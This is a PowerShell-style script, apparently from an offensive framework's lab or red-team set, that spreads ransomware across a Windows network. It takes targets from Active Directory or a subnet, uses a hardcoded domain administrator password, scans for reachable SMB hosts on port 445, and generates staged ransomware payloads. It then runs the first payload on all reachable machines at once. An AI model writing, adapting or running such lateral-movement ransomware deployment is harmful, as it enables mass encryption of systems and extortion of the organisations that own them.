param(
    [Parameter(ParameterSetName="Impersonate", Mandatory=$False, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory=$False, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [ValidateNotNullOrEmpty]
    [string[]]$Targets,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The local or domain username to authenticate with.")]
    [Parameter(ParameterSetName="Autotarget - Username and Password", Mandatory=$True, HelpMessage="The local or domain username to authenticate with.")]
    [ValidateNotNullOrEmpty]
    [string]$Username,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The password for the specified user.")]
    [Parameter(ParameterSetName="Autotarget - Username and Password", Mandatory=$True, HelpMessage="The password for the specified user.")]
    [ValidateNotNullOrEmpty]
    [string]$Password
)

$Targets = @('192.168.1.0/24')
$Username = 'administrator@lab.net';
$Password = '1qaz!QAZ';

#Import dependencies
load recon;
load lateral;

#Build a list of IP addresses to target
if($Targets -eq $null -or $Targets.Length -le 0) {
    #Autotarget from Active Directory
    $computers = computers | resolve | % { $_.ToString() };
} else {
    #Use explicit targetting
    $computers = $Targets | resolve | % { $_.ToString() };
}

#Build a list of local IP addressess
$localhost = New-Object 'System.Collections.Generic.Dictionary[string, string]';
$interfaces = interfaces;
foreach($interface in $interfaces) {
    foreach($entry in $interface.InterfaceIPs) {
        $ip = $entry.IP.ToString();
        if(!$localhost.ContainsKey($ip)) {
            $localhost.Add($ip, $ip);
        }
    }
}

#Remove localhost from target list
$computers = $computers | ? { !$localhost.ContainsKey($_.IPAddress); }

#Find systems that are alive via a quick port scan
$scan = scan -Targets ([string[]]$computers) -Ports @(445);
$alive = $scan | ? { $_.'445' -eq 'OPEN' };
$addresses = $alive | % { $_.IPAddress; }

#Generate the payload
$payload = payload -Kind 'ps_ransom_command';

#Pre-generate stage 2 and 3
payload -Kind 'ps_ransom_script' | Out-Null;
payload -Kind 'csharp_ransomware' | Out-Null;

#Deploy the payload to the targets we can reach
try {
    $results = Invoke-ParallelCommand -Targets ([string[]]$addresses) -Command $payload -Username $Username -Password $Password;
} catch {
    $_.Exception;
}

#Output the results
$results